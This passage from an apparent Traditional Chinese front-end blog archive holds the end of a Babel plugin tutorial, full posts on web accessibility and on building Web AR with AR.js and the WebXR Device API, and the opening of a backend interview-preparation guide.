pathpath 代表的是在 traverse AST 過程中，連接 node 之間的邊。所以你可以用 path.node 取得目前的節點，也可以用 path.parent 取得父節點。此外，path 還能透過 path.traverse 來在原有的 visitor 內進行 nested visiting，這對於想要讓 visitor 在某個特定 visitor 執行後再執行時很有幫助，可以參考 handbook 範例。

statestate 的用法在 handbook 上也沒有說得很明確，我的理解是一個貫串整個 traverse 過程的 global state，你可以在任意階段修改 state。其中也包含你想讓使用 plugin 的使用者傳入的 options 設定。


以上述 template 為例，你的 visitor 在遇到 type 為 Identifier 的節點時，就會執行 path.node.name = path.node.name.split(&#39;&#39;).reverse().join(&#39;&#39;);，也就是將該 Identifier node 的名稱給顛倒過來。
此外，Visitor 在 traverse AST 的過程中，會在節點上進進出出，所以其實我們是可以定義 enter 與 exit 的函式來進行操作的：
const MyVisitor = &#123;  Identifier: &#123;    enter() &#123;      console.log(&quot;Entered!&quot;);    &#125;,    exit() &#123;      console.log(&quot;Exited!&quot;);    &#125;  &#125;&#125;;

handbook 中有更多詳細介紹
動手撰寫自己的 Visitor知道基礎架構後，就可以開始撰寫 Visitor 了！
但你可能會有點沒頭緒該怎麼開始，因為你不知道要從哪個 node type 的 visitor function 開始寫。這就是 AST Exporler 的好處了，你只要將游標停放在編譯前的程式碼的任意位置上，右邊的 AST 樹就會自動 Focus 到對應的節點上頭（前提是要記得選取上方的 AutoFocus，預設會是啟用的）：

以範例來說，我們要轉換的是 &#123;&#39;#words-need-i18n&#39;&#125;，將游標指上去後發現他是一個 type 為 StringLiteral 的 node，這就是我們要撰寫的 visitor function！
export default function (babel) &#123;  const &#123; types: t &#125; = babel;    return &#123;    name: &quot;i18n-transform&quot;, // not required    visitor: &#123;      StringLiteral(path) &#123;        // some logic in here      &#125;    &#125;  &#125;;&#125;

接下來把需要的邏輯填寫上去：
visitor: &#123;  StringLiteral(path) &#123;    if (path.parent.type !== &#x27;JSXExpressionContainer&#x27;) return    if (path.node.value.startsWith(&#x27;#&#x27;)) &#123;      path.parentPath.replaceWith(          t.JSXElement(              t.JSXOpeningElement(                  t.JSXIdentifier(&#x27;FormattedMessage&#x27;),                    [t.JSXAttribute(                      t.JSXIdentifier(&#x27;id&#x27;),                        t.StringLiteral(path.node.value.replace(&#x27;#&#x27;,&#x27;&#x27;))                    )],                    true                ),                null,                [],                true            )        )    &#125;  &#125;&#125;


在前面有介紹到，path 代表連接著目前被拜訪到的節點，所以我們能用 path.node.value.startsWith(&#39;#&#39;) 來檢查目前節點的值是否為我們想要的（開頭為 hashtag）。但由於 StringLiteral 感覺得出來是到處都會出現的 node type，所以我們需要設立一些條件：當 path.parent.type !== &#39;JSXExpressionContainer&#39; 時，我們就 bypass 這次的 visit 操作。所謂的 JSXExpressionContainer 就是在 jsx 中的 &#123; &#125;。
當條件都成立時，也就代表我們的 visitor 成功找到我們想轉換的程式碼 &#123;&#39;#words-need-i18n&#39;&#125;。這時聰明如你，一定會想說那就把 path.node 替換掉就好了吧！
但是，path.node 目前指到的是 StringLiteral，也就是 #words-need-i18n，外面還有一層 JSXExpressionContainer，我們不能直接使用 path.node.replaceWith 來替換程式碼，我們要連同上一層都一起換掉，因此這邊需要使用 path.parentPath.replaceWith。以圖像表示的話大概像這樣：


接著，replaceWith 接收你要替換的節點當作參數，而這時我們最一開始宣告的 const &#123; types: t &#125; = babel; 就派上用場啦！
babel.types 可以幫我們創建出各種 type 的 node，也提供許多 type checking 的 function，像是剛剛我們檢查 path.parent.type 的地方其實應該更改為 !t.isJSXExpressionContainer(path.parent)。更多關於 babel.types 的操作可以參考 handbook 上的說明
但到這邊問題又來了，我們怎麼知道要創建什麼 node 呢？
我一開始也不知道，但抬頭想一想，AST Explorer 不是就會幫我們轉換 AST 嗎？那就把我們預期的結果程式碼也貼上去，不就知道他的 AST 長相了嗎？
大膽將 &lt;FormattedMessage id=&#123;&#39;#words-need-i18n&#39;&#125;&gt; 貼上去後，就能得到其 AST 結構：

接著呢，就到 babel 官網的 docs  裡面去查詢每一種需要創建的 type，各自要填入哪些參數，舉例來說，&lt;FormattedMessage&gt; 會是一個被 JSXOpeningElement 包起來，從 docs 能看到非常詳細的說明：

我們要填入三個參數: name, attributes 與 selfClosing，第一與第三個很好理解，中間的 attributes 裡面包含了其他的 type，這時你就需要再繼續往下查，直到完成所有需求為止。
照著這樣的思路，一一將 AST 內的結構轉換到你的 plugin 程式碼內，就大功告成啦！

結論當然這只是個很簡陋的實作，不過也算是把 plugin 的製作概念呈現了一遍，並稍加了解了 AST 的重要性與實用性。
在實作你所想要的 plugin 功能時，勢必會遇到複雜得多的狀況，建議大家還是直接在 handbook 上查看最直接，上面有更詳細的 API 介紹與教學，包含 babel-template 、 babel-types 的 builder 與 Validators，更有 Best Practices 可供參考。也可以看看高手們的作品
最後，不知道有沒有讀者會覺得整個 Plugin 的邏輯操作與大家熟悉的 jQuery 有點類似？都是選取到某個元件後，就針對該元件進行更動：$(&#39;StringLiteral&#39;).textContent = &#39;&lt;FormattedMessage id=&#123;&#39;xxx&#39;&#125;&gt;&#39;
我在查資料的過程中發現一篇非常有趣又很清楚的介紹，其中就是以 jQuery 來做類比（節錄其 slides 中的一段）：
Babel:Javascript :: jQuery:DOM
jQuery 幫助你改變 DOM，而 Babel 幫助你轉化 Javascirpt
實在是很貼切的比喻不是嗎？
資料來源
Writing custom Babel and ESLint plugins
How writing babel-plugin is like wrigint jQuery
Babel Plugin Handbook
AST Exporler
JAVASCRIPT AST VISUALIZER
AST specification

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>es6</tag>
        <tag>javascript</tag>
        <tag>pattern</tag>
        <tag>babel</tag>
        <tag>ast</tag>
      </tags>
  </entry>
  <entry>
    <title>Web Accessibility 的重要性</title>
    <url>/2019/10/13/web-accessibility-intro/</url>
    <content><![CDATA[前言你是否曾因為網路上被歧視、被霸凌的新聞或影片而憤憤不平？你是否曾因為各種身殘心不殘的勵志故事而感到激勵？如果你有過上述經驗，那當你在製作網站時，是否曾經考量過 Web Accessibility（a11y） 呢？
老實說，我真的很少在實作時認真的驗證自己的網站的可訪性，花在考量是否能支援 IE 9 的時間還比較多一些。（想當年在政府機關服務時，看到局處長很自豪官網拿到無障礙網站評等第一時，還覺得莫名其妙，想說網站這麼醜，到底哪裡無障礙 XD）
在實作的時候，PM 會拿數據告訴你，有多少用戶是使用舊版的瀏覽器，所以我們需要支援到何種程度，但應該很少 PM 會拿出數據告訴你，有多少 screen reader 來存取我們的網站·。
然而，光台灣，2018 年的身心障礙人口有一百多萬人，其中視覺障礙的有將近六萬（衛生福利處的資料），美國比例更高，有將近 25% 的身心障礙人口（資料來源）。
依照你產品的用戶比例，這些數據大概無法說服你的 PM，讓他們給你更多時間思考如何增強網站的可訪性，但仔細想想，如果你在乎那些身心健全卻不願意升級自己瀏覽器的人，而不在乎這些走出障礙，連接到網路吸取知識的殘障人士，你是不是無意中在他們的人生道路中增加了更多阻礙，不自覺地成為歧視他人的一方呢。
今天想透過這篇文章，整理一些資源與簡短的實作要點，喚醒大家對 Web Accessibility 重要性的認知，也是提醒自己在未來實作上必定要多加注意。
使用 screen reader 的感覺是什麼相信會看到這篇文章的人，多少對於 Web Accessiblity 都有了解，知道是為了輔助障礙人士閱讀網頁內容，平常實作時至少在 &lt;img&gt; 元素上會加上 alt 等文字來描述圖片。但你有真的使用過 screen reader 嗎？你知道使用這些輔助工具上網的人，看到的世界跟你有多大的不同嗎？
我原本也不知道，直到我試用了 Mac 內建的 VoiceOver，用它來閱讀平常看的網站，像是 wikipedia：


體驗實在很糟，除了機器人的聲調外，外加極快的語速，在你從瀏覽器的分頁標籤移動到真正的網頁內容前，還需經過許多瀏覽器本身按鈕選項的介紹，接著到了網頁內容，文章因為連結的關係，變得破碎（為了讓你知道是連結或是按鈕，在文字內容前都會先朗讀出該段內容的功能性，像是：連結、按鈕），閱讀順序也與我們憑眼睛觀看時的不同。
然而 Wikipedia 已經算是 a11y 處理得不錯的了，畢竟內容大多也只有文字與圖片。想想看現在這麼多炫麗介面的網站，各種需要使用者與之互動的功能，光用想像的就是悲劇，看一下 Google 大肆宣傳的 AMP Story：


在強調 Web performance 的同時，web accessibility 也該考量進去。這邊就有文章在討論關於 amp-story 在 a11y 的 issue，不過 ampproject 內是有 accessibility working group 在想辦法解局的。
上面的 Screen reader 範例比較是針對視障朋友的使用為主，現實中能造成生活不便的可不只有視覺上的困難，還有聽覺、肢體等等，像是滑鼠這類需要高度手眼協調能力的操作，就不是那麼有親和力，因此光是透過鍵盤操作網站的順暢度，就必須好好思考，也是實作 Web Accessibility 時的一大重點。
如果想快速體驗一下使用 screen reader 的效果，又不想學習 Voiceover 等系統內建 reader 的，可以到 udacity 提供的網站 試試，使用的是 Chrome 的 chromevox-lite 閱讀器，且有刻意將內容模糊化，感受會更真實點。
Web Accessibility 的資源與實作要點說了許多緣由以及範例，現在來談談該如何學習 Web Accessibility，並實作在我們的網站中。
網絡內容無障礙功能指南 - Web Content Accessibility Guidelines先從 W3C 指南了解 “無障礙” 的定義。網絡內容無障礙功能指南 (WCAG) 2.1，是 W3C 擬定的無障礙功能指南和最佳做法，旨在有系統地闡述“無障礙功能”的含義。很多國家政府機關都會要求根據此指南來實作網站。
WCAG 有四大原則：

可感知（Perceivable）：所有資訊與使用者介面元件都必須要能以各種使用者能感知的方式，呈現給使用者。像是能讓 Screen Reader 閱讀出內容。不能讓使用者透過各種感官都無法感知到內容。

可操作（Operable）：使用者元件與網頁內容間的導覽都要可操作，不能出現使用者無法操作的介面。

可理解（Understandable）：呈現給使用者的資訊與操作方式都要能被使用者理解。

強健（Robust）：不論是被哪種輔助科技工具或是各種 user agents 所存取，網站內容都要能不受影響，呈現給使用者完整的內容，若使用者使用的工具變得更加進步，網站也得跟上腳步，維持內容的存取、閱讀性。


這是無障礙內容的一個概覽，還可以透過 WebAIM 檢查清單，來檢視我們該如何依照 WCAG 的指南實作。
其他資源除了 W3C 的定義指南外，還有許多更親和的資源可以參考，畢竟 Web accessibility 不是很新的議題了，像是 MDN 或是 Google 都有非常詳細的資料與教學，Udacity 上也有相關課程。
看完大概都需要花上幾個小時的時間，如果想快速了解的話，其實也已經有不少關於 a11y 的繁中文章，像這篇 - 回歸初心，一探 Web Accessibility，簡短精要，整理了上面 Google 與 Udacity 課程的內容，適合快速了解何謂 a11y，而最近鐵人賽的這系列文也很不錯，蒐集整理非常多資訊，細節很多，可以當作參考工具，在實作時隨時翻閱，推推。
此外，上面的資源著重在一般的網站上，而身為資料視覺化的愛好者，我很好奇該如何處理 Data visualization 上的 Web Accessibility 問題。
從 Lindsey 的這篇文章 - Accessibility in d3 Bar Charts 中可以窺知一二。
主要是要在圖表中加入足夠的描述文字，然後在設計顏色時，使用一些輔助工具如 coblis 來建立 color blind friendly 的圖表。
若是較常使用 SVG 來製作動態圖表的人，推薦研讀一下這篇專門介紹如何為你的 SVG 增強 accessibility 的文章 -  accessible-svgs，可以為你的資訊圖表在 Web Accessibility 上帶來非常大的改善。
實作要點知道了為何需要了解 Web Accessibility，也知道了有哪些資源可以閱讀，接下來根據上面閱讀的資料，簡單總結幾個實作上要關注的重點：
思考網站能以什麼方式瀏覽這其實是 回歸初心，一探 Web Accessibility 這篇文章中所提到的結論，我覺得蠻有道理的。
與其思考使用者失去什麼感官能力，不如專注在你的網站能提供哪些方式瀏覽。可能是 screen reader、鍵盤（keyboard）、聲控或眼動儀等其他人機介面。從這些操作介面去思考該怎麼加強自己網站的可訪性。
網頁元件的可聚焦性所謂的可聚焦，指的就是元件能夠成為焦點，而所謂焦點，是指當前螢幕上瀏覽器當下能接收來自鍵盤輸入、剪貼板輸出的元件（字段、複選框、按鈕或連結等輸入項目），更簡單來說，就是使用者此刻正在操作的元件。
為什麼可聚焦性很重要呢？除了讓使用者知道自己目前所使用的元件外，就是讓 screen reader 知道目前該 read 哪個元件。而瀏覽器一次只能聚焦在一個元件上，這個特性讓 screen reader 不會同時讀到兩個不同元件的描述。
在一般瀏覽器上頭，被聚焦的元件通常預設會以一個藍色外框包裹住：

實務上很多人都會用 outline: none 把這個外框拿掉，但實際上是非常不友善的行為，若是不喜歡瀏覽器預設的樣式，可以跟設計師溝通，看要如何修改被聚焦的元件樣式，但記得要能讓使用者注意到樣式的變化，才能幫助他們判斷元件的聚焦與否。如 Youtube 上的回復查看按鈕：

另外要注意的是，並非所有元件都要設成可聚焦，像是文章內文本身，或是其他即便讓 screen reader 朗讀出來也無法很好傳達意思的元件，其實跳過反而比較不會造成混淆與困擾。
DOM 的順序Screen reader 在移動時，會依照 DOM 的順序進行，所以應當盡量將你想要呈現給使用者的內容順序，完整的對應到 DOM 的順序上頭。除此之外，還得注意 CSS 的影響，例如 float，就可能會造成視覺上的順序與 DOM 順序有所差異，導致 screen reader 朗讀的次序受到影響與畫面不符：
&lt;button style=&quot;float: right&quot;&gt;1&lt;/button&gt;&lt;button&gt;2&lt;/button&gt;&lt;button&gt;2&lt;/button&gt;

122
另外，善用 tabindex，能夠更好的幫助使用者操作鍵盤（tab）瀏覽網站時的移動順序，無論是跳過隱藏在 Responsive 表單選項中的元件，或是在開啟的 Modal 中製造出 Key trap，讓使用者不會移動到 Modal 覆蓋下的元件上。
語義化標籤眾所皆知，Semantic HTML 對於提高 SEO 很有幫助，然而，它也能大大增加網站的可訪性（大概也是因此才會讓 SEO 效果提升），一個好的 Semantic HTML Element 應該包含：

Role： 元件的類型（按鈕、input 元件、超連結等等）
Name(Label)：通常與 input 元件並用，像是 radio input、dropdown list 等等
State：元件當下的狀態（點擊、展開、收合）
Value：元件內的值（Input 元件內的值、Button 上的文字等等）

瀏覽器會根據你的 HTML 建造出 DOM Tree，同時也會依照你在 DOM 元件上的資訊建造出 Accessibility Tree（source）：

而 Screen reader 就會根據這棵 Accessibility Tree 進行朗讀，因此你提供的 Semantic HTML 越清楚，資訊越詳細，就能夠建構出越強健的 Accessibility Tree 供輔助工具參考。
再者，如同文章前頭提到的，網頁上的媒體元件，像是 img、video 或是視覺圖表，都應該提供對應的 alt 描述，讓 Screen reader 至少能根據 alt 來說明該媒體元件的內容。不過，若是單純拿來裝飾用的 img，可以給予 alt 空值，代表其裝飾性。
想檢測網站是否有足夠完整的 Accessibility Tree 的話，可以用 Chrome 打開你想看的網站，並且開啟開發者工具，在 Element 標籤內，右側可以找到 Accessibility 的 tab，在那邊就能看到當前頁面元件的 Accessibility Tree：

WAI-ARIAWAI-ARIA，代表 Web Accessibility Initiative — Accessibility Rich Internet Applications （網頁可訪性倡議 — 無障礙網頁應用）。
上面章節我們提到瀏覽器會依照 Semantic HTML Element 來建構 Accessibility Tree，然而有時你需要使用像是 div、span 等元素來做一些客製化的元件時，該怎麼辦呢？不就無法保持語義了嗎？
這時 WAI-ARIA 就派得上用場了。使用 ARIA 屬性，我們就可以補足元件缺少的訊息，讓它進入 Accessibility Tree 當中。（source）

舉個例子：
一個用 &lt;li&gt; 元件所客製化的 checkbox，我們可以依靠 CSS 讓他 “表現” 得像 checkbox，對於視力正常的人來說是沒問題的，但 screen reader 可不認得他，因此我們至少必須加上 ARIA 屬性中的：role 與 aria-*，讓其加入到 Accessibility Tree 中：
- &lt;li tabindex=&quot;0&quot; class=&quot;checkbox&quot; checked&gt;+ &lt;li tabindex=&quot;0&quot; class=&quot;checkbox&quot; role=&quot;checkbox&quot; checked aria-checked=&quot;true&quot;&gt;  Receive promotional offers&lt;/li&gt;

role ，等於宣告該 DOM 元件該扮演什麼角色，像是 checkbox、button 或 dialog 等，還可再分類出 Widget roles、Composite roles 和 Landmark roles 等等。詳細 spec 可以看 W3C 的定義
而搭配 role 使用的 aria-* 則為元件定義了屬性與狀態，像是上面例子中的 aria-checked=&quot;true&quot; 即為元素狀態的一種，告知 Accessibility Tree 這元件目前屬於 checked 狀態。
也能透過 aria-lable 設定專門給輔助工具使用的 API：
&lt;button aria-label=&quot;screen reader only label&quot;&gt;&lt;/button&gt;

或是設定父項&#x2F;子項聯繫，例如控制特定區域的客製化捲軸：
&lt;div role=&quot;scrollbar&quot; aria-controls=&quot;main&quot;&gt;&lt;/div&gt;&lt;div id=&quot;main&quot;&gt;// . . .&lt;/div&gt;

關於 role 與 aria-* 狀態和屬性，可以先從 MDN 的這份文件概觀所有列表，然後從 W3C 的定義中去翻找詳細資訊。
色彩、樣式文章前面有提到，設計顏色時，應當使用一些輔助工具如 coblis 來模擬色盲的使用者是如何 “看” 你的網站，可以根據這些測試與資訊，與設計師討論，製作出 color blind friendly 的介面。
除了顏色之外，從文字的大小、表格的間隙，到長條圖中每條 Bar 的距離，都可能影響到視覺障礙的使用者，也都可以在設計無障礙網站時考慮進去。
結論不知道大家投身 Web 領域的動機是什麼，我想一定有部分人的理由與我相同，相信 Web 是最平易近人的媒介，能輕易把任何資訊帶給全世界，你不用存錢半天才能買到一台 iPhone 進入 App Store 下載應用程式，只需要到圖書館把電腦打開，透過瀏覽器即可連接世界。如果你也有同樣信念，除了加強 Web performance，讓存取網站的門檻降低外，提升 Web Accessibility 讓網站能真正服務到 “所有人”，絕對也是必修的課題之一，弭平資訊落差，落實公平正義，從你我做起！
P.S. Web Accessibility 的內容很多，這篇文章旨在引起大家對其的重視，詳細的規格與實作細節可以從底下的參考資料中去閱讀。
資料來源
React rally 2019
Amphora
MDN - 可訪問性
Google - 無障礙功能
回歸初心，一探 Web Accessibility
實踐無障礙網頁設計（Web Accessibility）系列
Accessibility in d3 Bar Charts

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>web</tag>
        <tag>javascript</tag>
        <tag>web accessibility</tag>
        <tag>a11y</tag>
      </tags>
  </entry>
  <entry>
    <title>淺嚐 Web AR</title>
    <url>/2019/07/16/web-ar/</url>
    <content><![CDATA[前言近年 VR&#x2F;AR 一直不斷出現在大家的視線內，雖然一直沒有什麼殺手級的應用出現，但這阻止不了開發者們的雄心壯志，尤其是 JavaScript 社群，畢竟 Jeff Atwood 說過：

“Any application that can be written in JavaScript, will eventually be written in JavaScript.” — Jeff Atwood, Author, Entrepreneur, Cofounder of StackOverflow

隨著 a-frame 的出現，WebVR 成為現實，並且很容易開發；Web AR 部分進展則相對緩慢ㄧ些，瀏覽器原生支援的 API 還一直處於不穩定的開發階段，但即便如此，我們還是可以在特定版本的瀏覽器上使用，此外，也有像是 AR.js 這樣融合 artoolkit、three.js、ＷebGL 和 WebRTC 等技術的工具可以使用。
今天就來稍稍研究一下，看看目前的技術能如何開發 Web AR！
照慣例，開始前先看點 demo，把 Pokemon 帶到你家客應：



目前的工具有哪些CreateＷebVR 這網站上列出了一些目前有的 library，以及目前支援 WebAR 的瀏覽器：

其中 AR.js 使用了 A-Frame (基於 Three.js) 以及 JSARTookit5（JavaScript 移植版的 ARToolKit），而這兩個技術主要皆是利用 WebGL 為主，因此大多現行的瀏覽器都能直接支援，不需要特殊的 API。
這大概也是為何 AR.js 能在 GitHub 上擁有一萬多顆星星，遠勝過上列其他套件的原因。再加上作者的實驗證明 AR.js 即便在兩年的老舊手機上也能運行順暢，擁有良好的 Performance。
但 AR.js 也並非沒有缺點，由於是基於 ARToolKit，因此只能夠支援 Marker-based 的 AR 效果，也就是像最前面的 Demo 圖片一樣，是需要在鏡頭內放置一個設定好的 Marker，讓其辨識，取得環境的一些 Sensor 資訊，包含鏡頭的深淺遠近等等，才能讓 AR 物件渲染在視窗中。
即便如此，AR.js 其簡潔、便利的使用方式（有 a-frame 與 threejs 的 extension），能讓你用短短 10 行程式碼就產生出一個 WebAR 效果的網頁，還是非常好用的。

如果你是使用 AR.js 的話，基本上現行有支援 WebGL 的手機瀏覽器就都能夠運行，不需要額外的 Polyfill 等等。
但如果你想要使用非 Marker-based 效果的 AR 應用，你就得研究 WebXR Device API，其前身為 WebAR API。
WebXR Device APIWebXR Device API 現在還在不斷更新中，不是個穩定的 API。
運用到 WebXR Device API 的有 Google 使用的 three.ar.js 與整合 A-Frame 的 aframe-ar.js，以及 Mozilla 主導的 three.xr.js 和 aframe-xr.js。
Google 提供了 WebARonARCore 和 WebARonARKit 兩種分別在 Android 與 iOS 平台上運行的特殊 browsers，讓你能在上面跑 WebXR Device 相關的 API：而 Mozilla 在 iOS 上也推出 Mozilla WebXR Viewer 來對應，三者皆是用到手機平台原生的 ARKit。
如同剛剛所說，WebXR Device API 還很不穩定，而且 Google 與 Mozilla 各自在 Android 與 iOS 上有不同的實作，Google code lab 上的範例只能運行在 version 為 70 - 72 的 Chrome canary 上，而 Mozilla 雖然有推出 Mozilla WebXR Viewer，但上面的範例實作也只能運行在 Mozilla WebXR Viewer 上頭…
不過去看一下雙方的範例程式碼後，會發現其實用法蠻雷同的，大多都有下面這些流程（以 Google 的程式碼來當範例）：
判斷是否支援 WebXR Device API，並初始設定：
/**   * Fetches the XRDevice, if available.   */  async init() &#123;    // `navigator.xr` 是 WebXR Device API 的入口，有必要確認其存在    // 而 `XRSession` 中的 `requestHitTest` 則是要 enable #webxr-hit-test flag    // 確認這兩個 API 存在，確保能夠製造出點擊畫面    if (navigator.xr &amp;&amp; XRSession.prototype.requestHitTest) &#123;      try &#123;        this.device = await navigator.xr.requestDevice();      &#125; catch (e) &#123;        // Error handling，通知使用者的瀏覽器並不支援        this.onNoXRDevice();        return;      &#125;    &#125; else &#123;      // Error handling，通知使用者的瀏覽器並不支援      this.onNoXRDevice();      return;    &#125;    // 成功取得 XRDevice 物件後，需要 bind 一個 user gesture 的 event，然後呼叫    // `device.requestSession()`，這是規範在 spec  中的    document.querySelector(&#x27;#enter-ar&#x27;).addEventListener(&#x27;click&#x27;, this.onEnterAR);  &#125;

取得 XRDevice 後，利用 device.requestSession() 製造出運行 XR 的環境：
async onEnterAR() &#123;  const outputCanvas = document.createElement(&#x27;canvas&#x27;);  const ctx = outputCanvas.getContext(&#x27;xrpresent&#x27;);  try &#123;    // `device.requestSession()` 一定要是由 user 觸發，像是 click handler 內    const session = await this.device.requestSession(&#123;      outputContext: ctx,      environmentIntegration: true,    &#125;);    document.body.appendChild(outputCanvas);    // 成功創建 Session 後就能開始運算 AR 了    this.onSessionStarted(session)  &#125; catch (e) &#123;    // Error handling，通知使用者的瀏覽器並不支援    this.onNoXRDevice();  &#125;&#125;

當 XRSession 成功創建後，接著就是 set up three.js，撰寫 renderer，設定 scene、camera，並 attach 上 XRWebGLLayer，然後啟動 render loop：
async onSessionStarted(session) &#123;  this.session = session;  // ...省略  // 利用 Three.js 繪製 3D 物件，因此要借用 THREE.WebGLRenderer 來當作 XRSession 的 render layer  this.renderer = new THREE.WebGLRenderer(&#123;    alpha: true,    preserveDrawingBuffer: true,  &#125;);  // ...省略  //  設定 render layer  this.session.baseLayer = new XRWebGLLayer(this.session, this.gl);  const framebuffer = this.session.baseLayer.framebuffer;  this.renderer.setFramebuffer(framebuffer);  // ...省略, 設定 scene  this.scene = DemoUtils.createLitScene();  // ...省略, 設定 camera  this.camera = new THREE.PerspectiveCamera();  // ...省略, 更多的設定  // 在 `requestAnimationFrame` 中啟動 render loop  this.session.requestAnimationFrame(this.onXRFrame);  // ...省略&#125;

省略了很多細節，但大致的步驟就是這樣，詳細程式碼在此下載
對 WebXR Device API 比較有興趣的讀者除了 Google code lab 上的範例程式與 Mozilla 的 webxr-ios-js 範例 外，也可以到 immersive-web&#x2F;webxr 看看該 WebXR Device API 的 Specs detail 與解釋，他們也有提供 Sample Page 可作參考。
AR.js由於手邊沒有適合的 Android 手機，不能嘗試利用 WebXR Device API，所以今天就先來看看 AR.js 有多簡單。
你需要的就只有：

準備好 Marker
準備好 3D models
撰寫十行簡單的程式碼
host 你的 WebAR webapp

AR.js 有提供一個 Marker generator - AR.js Marker Training

你可以上傳想要的圖片放到 Marker 中，例如一個記載你的 WebVR webapp 網址的 QR code 就很適合。像這篇文章作者利用 AR.js 結合實體卡片送給他女友一個小驚喜。
我建議把你做好的 Marker 下載下來，否則當你手機對著電腦中的 marker 時，3D Model 方位視角會跟你是垂直的，不是很好看。
接著可以到 Poly 或是 sketchfab 下載 gltf 的 3D 模型。(搜尋想要的 Model 時記得勾選 downloadable，比較不會選到需要付費才能下載的，當然你要付費也很棒！)
以我最前面的例子來說，我在 sketchfab 中載了一個傑尼龜的模型

接著用 AR.js 對應 AFrame 的 extension 撰寫簡單的 WebVR app:
&lt;script src=&quot;https://aframe.io/releases/0.9.2/aframe.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://cdn.rawgit.com/jeromeetienne/AR.js/1.7.5/aframe/build/aframe-ar.js&quot;&gt;&lt;/script&gt;&lt;body style=&#x27;margin : 0px; overflow: hidden;&#x27;&gt;  &lt;a-scene embedded arjs=&#x27;sourceType: webcam; debugUIEnabled: false;&#x27;&gt;    &lt;a-marker type=&#x27;pattern&#x27; url=&#x27;assets/pattern-marker.patt&#x27;&gt;      &lt;a-entity position=&#x27;0 -6 -12&#x27; rotation=&quot;-20 0 0&quot; gltf-model=&quot;url(assets/scene.gltf)&quot;&gt;&lt;/a-entity&gt;    &lt;/a-marker&gt;  &lt;/a-scene&gt;&lt;/body&gt;

在 &lt;a-scene /&gt; 中，我們指定一個 attribute arjs，並且設定 sourceType 為 webcam，相關 attribute 設定其實來自 artoolkit system，有需要可以到 GitHub 的列表查看。
接著我們透過 &lt;a-marker /&gt; 放入我們製作的 marker，副檔名為 .patt，這邊的 type attribute，如果你是單純用 barcode 的話，可以設為 type=barcode，但若是客製化的 marker，就要設為 type=pattern。
最後在 &lt;a-entity /&gt; 上頭設定我們想要呈現的 AR 3D Model，gltf-model attribute 設定模型的路徑，再透過 position 與 rotation 來調整你的模型出現在鏡頭的位置。
這邊特別要注意一下，因為你載下來的 3D Model，都有自己的位置屬性，所以你可能會需要自己多加調整出適合的 position 與 rotation 值，否則你的 3D Model 很可能一直成像在你手機的鏡頭外而看不到，然後你還以為是程式出問題…
當手機鏡頭偵測到 &lt;a-marker /&gt; 內對應的 marker 時，就會在鏡頭內渲染出 &lt;a-entiy /&gt;。
如果只是像我一樣想要嘗試一下的話，可以簡單利用 Chrome 的 webapp - Web Server for Chrome 來 host 你的 htlm file，然後利用 ngork 或是 serveo 來當作你 localhost 的 proxy，讓你的手機可以方便相連。
一切順利的話，你就會看到一隻傑尼龜出現在你家裡啦～

如果你沒有手機可以玩，想用電腦 Browser 跑的話，會需要到 chrome://flags 中把 WebVR 的選項開啟，然後用 inpsecter 將 Browser 調整成手機模式。

並且需要加上 polyfill，因為普通的 chrome 是沒有支援 navigator.xr api 的：
&lt;script src=&#x27;https://cdn.jsdelivr.net/npm/webxr-polyfill@latest/build/webxr-polyfill.js&#x27;&gt;&lt;/script&gt;&lt;script&gt;  var polyfill = new WebXRPolyfill();&lt;/script&gt;


結論雖然 WebXR Device API 還不穩定，但就是在這時候開始試用才更能給出回饋，高手們來試試吧！決定下次拿公司測試機來跟著 Code lab 上的範例改改看！另外，AR.js 雖然目前是 Marker-based，但從 GitHub 上的一些討論 來看，之後應該是有機會支援 Markerless 的。
AR 這樣牽扯到電腦視覺、硬體、演算法、Sensor 等複雜運算的技術，要實作到 Web 上更是困難，進度慢是可以理解的，但還是衷心期盼著那一天，能夠開啟網頁就能丈量傢俱尺寸或是試穿衣物！
資料來源
Repository for the WebXR Device API Specification.
CreateＷebVR
AR.js
AR.js — The Simplest Way to get Cross-Browser Augmented Reality on the Web
Building AR&#x2F;VR with Javascript and HTML
Web vs App (AR edition)
Poly
sketchfab
用ar-js做一個讓另對方-喔喔喔喔-的小卡片吧
google code lab - WebXR
WebXR Sample page

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>web</tag>
        <tag>javascript</tag>
        <tag>ar</tag>
      </tags>
  </entry>
  <entry>
    <title>2019 Web Backend 面試總結</title>
    <url>/2019/10/04/web-backend-interview-in-2019/</url>
    <content><![CDATA[前言會想分享這篇整理，主要是因為今年是我第一次面試工作，在準備期間我曾無比焦慮，看過一篇又一篇的面經，總覺得怎麼還是這麼多不懂的，而且看了也未必在面試中回答得出來，後來我發現，原來是對於面試會考哪些類別的問題沒有概念，所以才感到焦慮。希望透過這篇後端面試總結，讓即將上路或是正在途中的人，可以有個方向，知道如何準備！
我會將後端面試分為六大類：

演算法（Algorithm）
程式語言（Programming Language）
作業系統（Operating System）
網路（Network）
系統設計（System Design）
特定軟體（像是 MySQL, Redis 等）

以下會針對這六大類，分別介紹並提供一些準備的資源！
演算法（Algorithm）演算法考題就是大家常說的 LeetCode，我面試的公司中，有的每一關都有類似 LeetCode 的考題，有的則會把這類考題集中在第一關。關於 LeetCode 考題，會建議別急著刷題，先把演算法的理論與應用理解後，再開始刷題，效率會更好！
針對理解演算法，會推薦*極客時間 - 數據結構與算法之美*，我覺得這是在「有限時間內」準備演算法的好教材！在介紹每個演算法之前，作者都會以一個實際應用的問題開頭，像是介紹 Stack 時，作者會先問「如何實現瀏覽器中上一頁、下一頁的功能？」，然後才介紹 Stack，最後再針對開頭的問題解答，這種學習方式能讓讀者對 Stack 能處理哪類型的問題更有感覺！很多時候面試中的問題並不是直接給 input 和 output，而是給一個應用情境，這時候帶著作者給的問題學習，效果會比較好！
針對刷題，我會推薦以下連結：

LeetCode Learn，這裡有針對基礎算法整理出來的考題，像是 Queue &amp; Stack, Linked List, Hash Table 等，對於一開始認識題型與認識解題技巧有很大的幫助。
TechBridge - LeetCode 刷題 Pattern，如果多刷點題，會發現不同的題型常常用到一樣的技巧，這時候認識刷題 Pattern 就很有幫助，透過刷題 Pattern 可以知道哪些類型的問題，都可以用同樣的 Pattern 處理！
